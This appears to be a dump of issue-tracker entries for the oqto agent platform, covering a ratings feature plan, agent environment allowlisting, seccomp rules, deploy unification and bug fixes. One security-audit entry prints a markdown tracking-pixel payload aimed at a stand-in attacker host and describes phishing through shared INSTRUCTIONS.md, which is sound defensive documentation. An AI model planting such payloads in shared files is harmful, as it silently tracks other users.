oqto does not currently persist the outbound LLM request body. Look at
`backend/crates/oqto/src/pi/client.rs` and the runner's Pi dispatch in
`backend/crates/oqto/src/runner/daemon/server/handlers/pi.rs` -- the system
prompt, tool definitions, and full message history sent to Pi are ephemeral.

Without durable capture of what the model actually saw, any "input_snapshot"
reconstructed at rating time is fabricated from post-facto structured parts in
`oqto_log_messages` and drifts from the real prompt. For GEPA that is
garbage-in.

Pick ONE before cutting code:

  A) Add an `oqto_log_llm_requests` table (turn_id, system_prompt, tools_json,
     messages_json, model, captured_at) and write on every outbound Pi request.
     Correct answer for training data fidelity. Expands scope.

  B) Accept lossy reconstruction (concatenate prior `oqto_log_messages` + best
     effort system prompt lookup) and document the fidelity gap in the export
     JSONL. Faster ship, compromised training data.

Write a short plan proposing A or B with reasoning. Get user signoff before
implementing.

## Architecture constraints (from CLAUDE.md -- non-negotiable)

- TRX-first: issue in progress before edits, closed with resolution before commit
- Authoritative store is `oqto-log` (per-workspace SQLite at
  `~/.local/share/oqto/oqto-log/<hash>/oqto-log.sqlite`). Do NOT write to hstry.
- Reference the oqto canonical `session_id`, never `platform_id` / `external_id`
  in the ratings schema. Never persist `tmp:*` or `pending-*` IDs.
- Do not write Pi JSONL session files from oqto.
- Zero warnings: `cargo clippy` clean, `just lint-rust-ai-guardrails` clean,
  `bun run lint` clean (incl. useEffect guardrail).

## Backend scope (Rust)

1. Migration: `backend/crates/oqto/migrations_oqto_log/<next-ts>_message_ratings.sql`
   Create `oqto_log_message_ratings`:
     - `rating_id TEXT PRIMARY KEY` (UUIDv7)
     - `message_id TEXT NOT NULL` (assistant messages only, enforce in handler)
     - `session_id TEXT NOT NULL` (oqto canonical id)
     - `user_id TEXT NOT NULL`
     - `rating TEXT NOT NULL CHECK (rating IN ('up','down'))`
     - `annotation TEXT`
     - `tags_json TEXT NOT NULL DEFAULT '[]'`
     - `model TEXT`
     - `created_at`, `updated_at TEXT NOT NULL DEFAULT (datetime('now'))`
     - UNIQUE (message_id, user_id)

2. Types: `backend/crates/oqto-protocol/src/ratings.rs` with
   `#[derive(Serialize, Deserialize, ts_rs::TS)]`. Re-export from `lib.rs`.
   Run `just gen-types` after; commit generated `frontend/src/generated/MessageRating.ts`.

3. Store extensions in `backend/crates/oqto/src/oqto_log/store.rs`:
   - `upsert_rating`, `delete_rating`, `list_ratings`, `export_ratings_jsonl`

4. Handler: `backend/crates/oqto/src/api/handlers/ratings.rs` -- mirror the
   shape of `handlers/feedback.rs` exactly (State, CurrentUser, ApiResult,
   ApiError). Routes:
   - `POST   /api/ratings`         upsert
   - `GET    /api/ratings`         ?session_id=&model=&rating=&tag=
   - `GET    /api/ratings/export`  streams JSONL
   - `DELETE /api/ratings/:id`     owner-only

5. Routes wired in `backend/crates/oqto/src/api/routes.rs`.

## Frontend scope (React/TypeScript)

1. Extend the assistant message toolbar in
   `frontend/features/chat/components/ChatView.tsx` (~line 3684, next to
   `ReadAloudButton` / `CopyButton`). Always visible, subtle. Toggle off on
   repeat click. Switching direction is instant.

2. New components: `RatingButtons.tsx`, `RatingDrawer.tsx` (annotation +
   tags, auto-save on blur).

3. API client in `frontend/src/lib/api/`. Import types from
   `@/generated/MessageRating`.

4. Settings view: reuse existing settings page -- total count, breakdown by
   model x rating, Export JSONL button, 70/30 train/dev split note.

5. No raw `useEffect`. Use approved hooks from `frontend/src/hooks/`.

## Definition of done

- [ ] A-vs-B decision approved by user
- [ ] Migration applies cleanly on a fresh workspace DB
- [ ] `cargo clippy --all-targets` zero warnings on touched crates
- [ ] `just lint-rust-ai-guardrails` passes
- [ ] `just gen-types` run, generated TS committed
- [ ] `bun run build` + `bun run lint` clean (useEffect guardrail baseline updated
      if count changed)
- [ ] All four endpoints verified via curl
- [ ] End-to-end: rate a message in the UI, export JSONL, confirm one line has
      the shape DSPy expects: `{input, output, rating, annotation, tags, model}`
- [ ] If option B: fidelity-gap note included in the export output or docs

## Suggested child issues (create as this epic is planned)

- Design spike: durable LLM request capture (option A vs B)
- Backend: migration + store + handler + routes
- Backend: JSONL export with DSPy-shaped payload
- Frontend: rating buttons + annotation drawer in ChatView
- Frontend: export / stats view in settings
- Docs: update CLAUDE.md architecture section with ratings table

title: Clean env for agent processes: env_clear + explicit allowlist
description:
Currently agent processes inherit the full parent environment. Add env_clear() to spawn path and build complete env map in session service (system vars + auth vars + tooling vars). Single authority for what env the agent sees.

System vars needed:
- HOME, USER, SHELL, LANG, LC_ALL
- PATH (already extended by sandbox)
- TERM, COLORTERM, COLORFGBG, TERM_PROGRAM
- DISPLAY, WAYLAND_DISPLAY (clipboard/browser)
- TMUX, WT_SESSION
- EDITOR, VISUAL
- XDG_RUNTIME_DIR, TMPDIR
- PI_* (all Pi prefixed vars)

Auth vars (already injected):
- EAVS_API_KEY, EAVS_URL, EAVS_VIRTUAL_KEY
- ANTHROPIC_API_KEY, OPENAI_API_KEY (same as eavs key)

Risk: missing an env var breaks Pi or tools silently. Needs careful rollout with logging of stripped vars.

title: oqto-sandbox seccomp allowlist omits stat/lstat/timer_create family, breaking dev tooling (cargo, timeout) in dev profile enforce mode
close_reason: Completed dev seccomp allowlist (default.policy.toml): added stat,lstat (cargo/libgit2 EPERM root cause), timer_create family (timeout), sysinfo,membarrier,sched_set*,get/setpriority,mlock2,pidfd_open/send_signal,getcpu,restart_syscall - all within Docker default-allow baseline; default_action=errno and explicit_deny (ptrace/mount/kexec/modules/reboot) unchanged. Verified: all 21 names resolve in libseccomp; TOML parses (204 syscalls); regenerated default-x86_64.bpf (212 insns) bytecode-confirms all 21 encoded as JEQ allow-compares and ptrace(101)/mount(165) absent (denied). Activation requires deploy of regenerated bpf to /usr/local/share/oqto/seccomp/default.bpf (+/etc/oqto/seccomp/default.bpf) and relaunch of sandboxed sessions. Follow-up oqto-58sj tracks seccomp Audit-silently-enforces semantics.

title: Unify Oqto deploy/update around single release layout and manifest
description:
Goal
Unify Oqto install/deploy/update around a single artifact + manifest driven path.

Current status
- Epic remains in progress.
- Significant progress completed on dist manifest workflow and bootstrap/install primitives.

Completed recently
- Added `dist/manifest.toml` as canonical asset map, including shipped Pi extension set.
- Added dist workflow scripts + just targets:
  - `dist-sync`
  - `dist-stage-binaries [--build]`
  - `lint-dist-manifest` / `lint-dist-manifest-strict`
  - `dist-package`
- Added bootstrap installer `scripts/install.sh` with checksum verification.
- Implemented `oqto-setup install` subcommand (artifact install + checksum verify + transactional activation + bin relinks + doctor hook).
- Wired `scripts/deploy.sh` with artifact mode (`--artifact`, `--checksum`) that deploys via `oqto-setup install`.
- Wired setup update release path (`scripts/setup/12-update.sh`) to activate release artifacts via `oqto-setup install`.

Still missing
- Make artifact-based path the default required deploy path (legacy prepare/activate path still present).
- Finish full setup convergence (remaining legacy direct install logic outside update path).
- Complete manifest-driven seeding/validation in install runtime.
- Add migration hardening + full personal/team E2E matrix and close-open child tasks accordingly.

title: Define canonical host layout and copy/symlink policy
description:
Define and document canonical install layout with immutable/mutable layering.

Deliverables
- docs/reference/install-layout.md (or equivalent) with exact host paths and ownership/mode expectations.
- Layer definitions: release immutable, admin mutable config, user/workspace mutable state.
- Copy-vs-symlink policy per file class.

Acceptance
- Path table covers /var/lib/oqto/releases, /usr/local/bin links, /etc/oqto, /var/lib/oqto, ~/.pi and workdir template outputs.
- Reviewed against current deploy.sh + setup.sh behavior with explicit drift notes.
close_reason: Added docs/reference/install-layout.md with canonical host layers, file classes, copy-vs-symlink matrix, override precedence, activation contract, and current drift notes; linked from install-contract doc.

title: Introduce dist manifest and asset classification
description:
Create authoritative shipped asset manifest in-repo.

Deliverables
- dist/manifest.toml schema and initial manifest.
- Dist tree structure for immutable assets and mutable templates.
- Packaging validation tooling to ensure manifest and shipped files match.

Acceptance
- Manifest classifies each shipped path as immutable/symlink, mutable-copy-once, or runtime-state.
- CI or local verification command fails on manifest drift.

title: Unify setup and deploy activation path
description:
Unify setup and deploy activation onto ONE engine: `oqto-setup install` (the ADR-0016 / ADR-0018 transactional activation contract). Delete `scripts/deploy.sh`'s parallel bash reimplementation of activation. After this, `deploy.sh` is a thin SSH/iteration driver only.

## Concrete plan — bucket every deploy.sh function

KEEP in deploy.sh (genuinely shell's job — host iteration + transport):
- arg parsing, ssh()/scp() wrappers, host_exec(), host_exec_sudo()
- parse_hosts(), should_deploy(), is_canary_host(), collect_targets(), run_targets()
- prime_sudo_credentials(), start/stop_sudo_keepalive() (until folded into oqto-hostd, vemr.6)
- emit_event() (or move audit into oqto-setup; decide during impl)
- build_artifacts() — DEV build trigger only, behind --from-source (ADR-0018)
- deploy_via_oqto_setup_install() — becomes THE per-host path: push artifact, run `oqto-setup install`

MOVE into oqto-setup / oqto-provisioning (Rust, typed, tested):
- prepare_host(), install_current_symlinks(), activate_host(), rollback_host()
- prune_old_releases(), health_check_host(), restart_services_ordered()
- install_seccomp_bpf(), configure_trace_environment()
- preflight_host() + check_dependency_compatibility() -> oqto-provisioning::evaluate_manifest (doctor), version gates from dependencies.toml

DELETE / relocate to `oqto-log` subcommands (deploy GATES on them, does not inline them):
- run_mmry_jsonl_migration, run_oqto_log_migration_mode, quiesce_oqto_log_writers
- auto_heal_oqto_log_corruption, restore_oqto_log_from_backup, run_oqto_log_deploy_gate
- oqto_log_fingerprint, extract_corrupted_workspaces_from_error, workspace_to_db_hash
- (coordinate with oqto-t3jv / oqto-5stn — migration belongs to oqto-log, not deploy)

DELETE once socket-activation lands (ADR-0002, oqto-6k4f) — these are the restart choreography that socket activation removes:
- restart_single_user_service, start_single_user_service_fallback
- sync_single_user_unit_files, restart_all_multi_user_runners

## Done when
- `oqto-setup install` is the only activation path; no staging/activate/rollback/prune/health logic remains in any .sh.
- deploy.sh measurably shrinks (~2178 -> target <800 LOC).
- setup update path (scripts/setup/12-update.sh) calls the same `oqto-setup install`, no second activation branch.
- E2E matrix (vemr.8) exercises the single engine for personal + team.

## References
docs/adr/0018-single-install-update-deploy-engine.md, docs/adr/0016-canonical-installation-layout.md

title: Establish install/update E2E validation matrix
description:
Install/update validation matrix automation added.

Delivered

  - plan mode by default (safe)
  - optional --execute mode
  - validates artifact install path via oqto-setup install
  - validates doctor for personal/team profiles including --strict
  - validates setup wrapper doctor entry points
- SETUP.md updated with matrix usage examples.

Next
- Run matrix in execute mode on dedicated personal and team test hosts and attach evidence.

title: Consolidate binary acquisition onto one manifest-driven prebuilt-artifact path; delete the 4 duplicate impls
description:
"Get binary X onto a host" exists as 4 divergent implementations (ADR-0018). Collapse to ONE manifest-driven path that downloads prebuilt, checksummed artifacts.

## The 4 to collapse
1. scripts/install.sh — download release tarball + oqto-setup install (the good path / keep as bootstrap)
2. deploy/docker/Dockerfile downloader stage — downloads every binary from GitHub releases (reference behavior)
3. scripts/setup/08-agent-tools.sh `download_or_build_tool` — release download + cargo-install fallback (DELETE)
4. scripts/deploy.sh `remediate_dependency()` — release download + cargo-install-from-source fallback (DELETE)

## Plan
- One acquisition function in the typed core, driven by dist/manifest.toml + dependencies.toml pins.
- release.yml publishes a COMPLETE prebuilt bundle: oqto's crates AND byteowlz deps (trx, mmry, eavs, agntz, mailz, sx, scrpr, tmpltr, sldr, skdlr, ignr). Currently release.yml only ships oqto's own binaries.
- `just install-deps` / `install-all` stop building ~12 sibling repos from source by default; build-from-source moves behind an explicit dev flag (ADR-0018).
- Verify checksums on every download; fail closed on mismatch.

## Done when
- Exactly one code path downloads/installs component binaries; 08-agent-tools.sh and remediate_dependency() deleted.
- A fresh host installs the full stack from the published bundle with no Rust/cargo toolchain present.

## References
docs/adr/0018-single-install-update-deploy-engine.md

title: Make dist packaging fail-closed: validate extensions + gate package.sh
description: package.sh blindly 'cp -R dist/immutable' with NO validation - it can ship an incomplete/empty tarball (live footgun now that extensions are untracked and pulled at release). The validator (verify-dist-manifest.py) only checks [[assets]] sources; it IGNORES [pi_agent_extensions].items, so missing extensions go undetected - exactly the gap. Fix: (1) extend validator to require each [pi_agent_extensions].items dir exists (with --allow-missing-extensions for lenient dev lint), (2) run the strict validator at the top of package.sh so a broken tarball is structurally impossible. Root-cause fix for the dist-hygiene class (follows oqto-v6b6).
close_reason: Validator: kind-based --allow-missing-extensions exemption (extensions are kind=pi-extension assets, already validated via [[assets]]; the gap was the lenient lint breaking once they're untracked). package.sh runs strict validation first -> fail-closed, proven: missing extension aborts packaging with zero artifacts produced. Dev lenient lint passes pre-sync. Verified strict-fail / lenient-pass / all-present-pass.

title: Overlay filesystem isolation for agent toolchains
description:
Use bwrap --overlay to isolate agent package installs from user environment.

Goals
- Agent npm/pip/cargo installs never modify user real paths.
- User environment stays clean even if agent installs malicious packages.
- Cleanup is trivial: discard overlay directory.
- Shared read-only base for cache efficiency.

Design
- Mount real toolchain paths (~/.npm, ~/.cargo, ~/.local/share/uv) as read-only lower layer.
- Agent writes go to per-workspace overlay: ~/.oqto/overlays/{workspace-hash}/
- Agent sees merged view (upper wins), user sees clean original.
- Overlay handles conflicts, deletes (whiteout), and modifications (copy-up) transparently.

Profile integration
- strict/development profiles: overlay enabled.
- privileged profile: no overlay, direct write.
- godmode profile: no sandbox at all.

Definition of done
- Agent package installs are isolated via overlay.
- User toolchains are never modified by agent activity.
- Overlay cleanup is one command per workspace.
- Configurable per profile.

Multi-user mmry cutover remainder tracked by oqto-6ek1. Verified.

title: Make workspace scaffolding more ergonomic for agents
description:
Currently scaffolding a new oqto workspace requires manually creating multiple files and directories (.oqto/workspace.toml, .oqto/sandbox.toml, AGENTS.md, .pi/skills/, directory structure, git init, etc.) and then hitting the API to create a session. oqto-scaffold exists as a crate but is not built/installed, and it lacks key features for agent use:

- No way to scaffold from within an agent session (e.g. via API endpoint or simple CLI)
- No session auto-creation after scaffolding (agent had to curl the API manually)
- No skill copying/linking from the templates repo
- No way to specify a display_name for workspace.toml
- Templates repo discovery requires manual config

Proposal:
1. Build and install oqto-scaffold (or integrate scaffolding into oqtoctl)
2. Add a POST /api/projects/create endpoint that scaffolds + creates session in one call
3. Support --display-name, --skills (copies from oqto-templates), --template flags
4. Auto-init git and trx
5. Return the created session so the agent can immediately redirect/use it
6. Consider adding scaffolding as an agntz or oqtoctl subcommand so agents can use it without raw API calls

title: Raw markdown/JSON leaking on frontend at turn end
description:
Frontend renders raw canonical message part JSON as plain text in chat bubbles at turn end.

## Observed
At the start of the assistant turn, raw JSON like this leaks into the chat UI:



This appears to be the raw canonical message parts array (thinking + tool_call) being displayed instead of being parsed and rendered properly by the frontend message renderer.

## Screenshots
- @uploads/IMG_8326.png — shows raw JSON at top of assistant response after user asks "What model are you ?"
- @uploads/IMG_8327.png — shows same raw JSON plus tool result sections below

## Expected
Thinking parts should render as expandable thinking blocks (or be hidden). Tool calls should render as compact tool-call pills/blocks. Raw JSON should never be visible to the user.

## Suspected area
Frontend message rendering pipeline — likely the message-to-React rendering path is falling through to a raw text display when it encounters parts it doesn't know how to render, or the message payload is being stringified and appended as text.

## Related
- oqto-dnj4 — model mismatch (same screenshots show both bugs)
close_reason: Fixed frontend normalization so stringified canonical parts nested inside text parts are expanded into thinking/tool parts instead of rendering raw JSON; added regression test.

title: Vite dev server fails to start: ghostty-vt.wasm copy hits EPERM on copy_file_range filesystems
description: copyGhosttyWasm plugin (frontend/vite.config.ts) copies node_modules/ghostty-web/ghostty-vt.wasm -> public/ via node fs copy, which returns EPERM on this host's filesystem even though both source (777, wismut) and public/ (writable, wismut) are fine - i.e. a copy_file_range/reflink EPERM, not a permissions/ownership issue. Blocks 'just dev' / vite config load locally. Fix: make the copy resilient (fallback to read+write stream, or COPYFILE_* flags / try-catch with manual copy) so CoW/overlay/virtiofs filesystems work. Discovered while verifying oqto-sp28.
close_reason: Fixed: copyGhosttyWasm falls back to read+write copy on EPERM/ENOSYS/EXDEV (copy_file_range/reflink rejected by host FS). Verified: vite config loads (CONFIG_OK), wasm copied to public/ (423045 bytes) via fallback, dev-server config no longer EPERMs. Commit in main.

title: Shared workspace sessions: get_messages returns 0 because oqto session ID doesn't match any hstry column
description:
Root cause identified: NOT a session ID mismatch issue. The real problem was hstry crash-looping on adapter version mismatch (hstry 0.5.7 binary with 0.5.5 adapters). This caused:

1. hstry daemon down for shared workspace users (1100+ crash-loop restarts)
2. Runner couldn't persist messages via gRPC ('Connection refused')  
3. Events couldn't be forwarded to backend ('Broken pipe')
4. Pi JSONL captured all messages correctly but hstry never received them

Fixed:
- Tagged hstry v0.5.7 in git (missing tag caused 'hstry adapters update' to fail)
- Updated global and per-user adapters on octo-azure
- Manually inserted 2 missing messages into hstry SQLite for affected conversation
- Added 'hstry adapters update' to deploy script (runs before service restart)
- Filed trx-8em1 in hstry: embed adapters in binary to eliminate this failure class

The session ID mismatch (multiple oqto session IDs mapping to same Pi session) is a separate, lower-priority issue that doesn't cause data loss.

title: Chat history sidebar empty: backend wrongly reports no runner in single-user mode
description:
## Summary
On recent deployments, the right sidebar can show no chat sessions and a `Retry` banner. The frontend is healthy, but `/api/chat-history` returns HTTP 500 with:

`Runner is required but not available for this user.`

This makes chat history appear empty even though hstry data exists.

## User Impact
- Session list appears empty / partially empty.
- Users may think data is lost.
- Retry does not recover because backend returns persistent 500.

## Evidence
### 1) hstry is alive and populated
- `hstry stats --json` reports:
  - conversations: 2448
  - messages: 308538
  - recent activity present

### 2) API failure path from browser session
- Fetch from authenticated browser context:
  - `GET /api/chat-history`
  - Response: `500`
  - Body: `{"error":"Internal server error: Runner is required but not available for this user.","code":"INTERNAL_ERROR"}`

### 3) Backend code path likely responsible
In `backend/crates/oqto/src/main.rs`, app state receives `runner_socket_pattern` only inside:
```rust
if ctx.config.local.linux_users.enabled {
    state = state.with_runner_socket_pattern(ctx.config.local.runner_socket_pattern.clone());
}
```
When `local.linux_users.enabled = false` (single-user dev/local), `state.runner_socket_pattern` may remain `None`.

Then `list_chat_history` in `backend/crates/oqto/src/api/handlers/chat.rs` resolves runner via `resolve_runner_for_target(...)` and fails with:
`Runner is required but not available for this user.`

## Config context where issue reproduces
`~/.config/oqto/config.toml`:
- `[local] single_user = true`
- `[local.linux_users] enabled = false`
- `[local] runner_socket_pattern = "/run/user/{uid}/oqto-runner.sock"`

Runner itself is running and reachable at `/run/user/1000/oqto-runner.sock`, but API resolution path does not see configured pattern due to state wiring.

## Expected Behavior
`/api/chat-history` should work in single-user mode as long as a valid `local.runner_socket_pattern` is configured and runner is healthy.

## Proposed Fix
1. In backend startup, set `state.with_runner_socket_pattern(ctx.config.local.runner_socket_pattern.clone())` independent of `local.linux_users.enabled`.
2. Keep Linux-user mapping (`state.with_linux_users(...)`) gated by `linux_users.enabled`.
3. Add regression tests for:
   - single-user + linux_users disabled + runner_socket_pattern set => chat-history returns data
   - missing runner socket pattern => explicit config error path (clear diagnostic)

## Acceptance Criteria
- [ ] In single-user mode (`linux_users.enabled=false`), authenticated `GET /api/chat-history` returns 200 when runner is up.
- [ ] Sidebar sessions list populates without manual backfill.
- [ ] Error banner disappears in normal healthy state.
- [ ] A test covers this startup wiring and prevents regressions.
- [ ] Logs clearly distinguish "runner unreachable" vs "runner socket pattern not configured".

## Severity / Priority rationale
High (P1): historical chats appear missing; core workflow blocked/confusing.
close_reason: Fixed startup wiring: local.runner_socket_pattern is now applied regardless of linux_users.enabled, so single-user mode can resolve runner clients for chat-history. Added regression tests in backend/crates/oqto/src/main.rs for single-user (linux_users disabled) and linux-users-enabled wiring paths.

title: Docker image: all-in-one oqto container
description:
Ship oqto as a single Docker image with all required binaries baked in.

**Included binaries:**
- oqto, oqto-runner, oqto-files, oqto-sandbox, pi-bridge (this repo)
- hstry, eavs, mmry, agntz, trx, mailz, tmpltr, scrpr, sldr, ignr, sx (byteowlz Rust tools)
- kokorox (TTS, small enough to include)
- pi + bun (agent harness)
- typst, uv, yt-dlp (external tools)

**Excluded:**
- eaRS / whisper models (too large, GPU-dependent)

**Deliverables:**
- Multi-stage Dockerfile (builder for Rust, slim runtime)
- docker-compose.yml with volume mounts and env var config
- Entrypoint script that runs oqto init + starts required services (hstry, eavs, oqto serve)
- Documentation in README

**Runtime config:**
- LLM API keys via environment variables
- Persistent data via volumes (/data for hstry/mmry, /workspaces for user projects)
- Single port exposure (8080 for API, 3000 for frontend)

title: Audit: shared-workspace privacy hardening for INSTRUCTIONS.md auto-render
description:
Security audit of oqto-q8v7 found no critical vulnerabilities (no raw HTML, no script execution, mermaid strict mode, default url-transform blocks javascript:/vbscript:, file-access authorized via existing mux-files boundary). One residual risk in shared workspaces is tracked here:

A malicious member of a shared workspace can write INSTRUCTIONS.md, which auto-renders for every other member without user action. Within the renderer's hard limits this allows:
1. Tracking pixels via markdown image syntax (![](https://attacker/p.png?u=...)) — every viewer fetches, revealing IP + view-time
2. Phishing via misleading link text (links are target=_blank rel=noopener noreferrer but still navigate)
3. Social engineering: the card has no author/mtime attribution

These risks apply to any markdown rendered in chat; the new exposure is that loading is automatic without user intent. Proportionate mitigations:
- Show file mtime + last-writer in the InstructionsPinnedMessage header (requires backend stat)
- Optionally strip image nodes or pass a stricter urlTransform for INSTRUCTIONS.md specifically
- For shared workspaces, surface a one-time 'show INSTRUCTIONS.md from <user>' confirmation

Files: frontend/features/chat/components/InstructionsPinnedMessage.tsx, frontend/hooks/use-workspace-instructions.ts.

Not a blocker for q8v7 — current state is consistent with all other markdown-rendered surfaces in the app.

title: Implement version vectors for deterministic Pi->hstry->Frontend sync
description:
Add a monotonic version counter to hstry conversations. Every append_messages or write_conversation increments it atomically. The runner includes MessageVersion { version, message_count, last_message_hash } in every agent.idle event. Frontend compares local vs server version:

- local.version == server.version: in sync, no action
- local.version < server.version: fetch from hstry (authoritative)
- local.version > server.version: impossible, log error

This makes 'am I in sync?' an O(1) deterministic check. No heuristics, no timeouts, no 'maybe we should refetch just in case.'

Requires changes in:
1. hstry: Add version column to conversations table + auto-increment trigger
2. oqto-runner pi_manager.rs: Read version after persist, include in agent.idle
3. oqto-protocol: Add MessageVersion to AgentIdle event payload
4. Frontend useChat.ts: Compare versions on agent.idle

See: docs/design/message-sync-invariants.md section 5.

description: Root cause: get_workspace_chat_session_messages Authoritative preferred Pi JSONL fallback whenever raw JSONL count exceeded projected oqto-log count. Raw Pi JSONL contains lower-level/duplicate event material, so sessions returned 72/89/98 messages while oqto-log projection had 44/69 clean messages. Fix: prefer non-empty projected oqto-log messages; only use Pi JSONL fallback when projection is missing/empty.
